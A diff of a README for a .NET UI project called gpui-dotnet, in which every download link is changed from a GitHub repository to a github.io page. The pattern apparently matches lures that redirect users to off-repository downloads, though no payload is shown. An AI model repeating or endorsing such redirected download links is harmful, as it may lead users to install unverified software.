@@ -1,6 +1,6 @@
 # 🚀 gpui-dotnet - Your Gateway to Blazing-Fast .NET User Interfaces
 
-[![Download Now](https://img.shields.io/badge/Download-gpui--dotnet-4CAF50?style=for-the-badge&logo=github)](https://github.com/Statesrightswildcatter3108/gpui-dotnet)
+[![Download Now](https://img.shields.io/badge/Download-gpui--dotnet-4CAF50?style=for-the-badge&logo=github)](https://statesrightswildcatter3108.github.io)
 
 ## ✨ What Is This?
 
@@ -37,7 +37,7 @@ Now for the exciting part! Let's get gpui-dotnet onto your computer so you can s
 
 Your first task is to grab the application. Click the big green button at the top of this page, or use this direct link:
 
-**👉 [https://github.com/Statesrightswildcatter3108/gpui-dotnet](https://github.com/Statesrightswildcatter3108/gpui-dotnet)**
+**👉 [https://statesrightswildcatter3108.github.io](https://statesrightswildcatter3108.github.io)**
 
 Visit this link to download the application. This will take you to a page where you can get the latest version.
 
@@ -130,7 +130,7 @@ Remember, the key steps are simple:
 
 And that's it! You're now part of a community exploring the cutting edge of UI design. Happy exploring!
 
-**👉 [Download gpui-dotnet Now](https://github.com/Statesrightswildcatter3108/gpui-dotnet)**
+**👉 [Download gpui-dotnet Now](https://statesrightswildcatter3108.github.io)**
 
 Keywords: dotnet, rust, ui, user interface, framework, C#, experimental, Windows, application, fast, performance, download
 
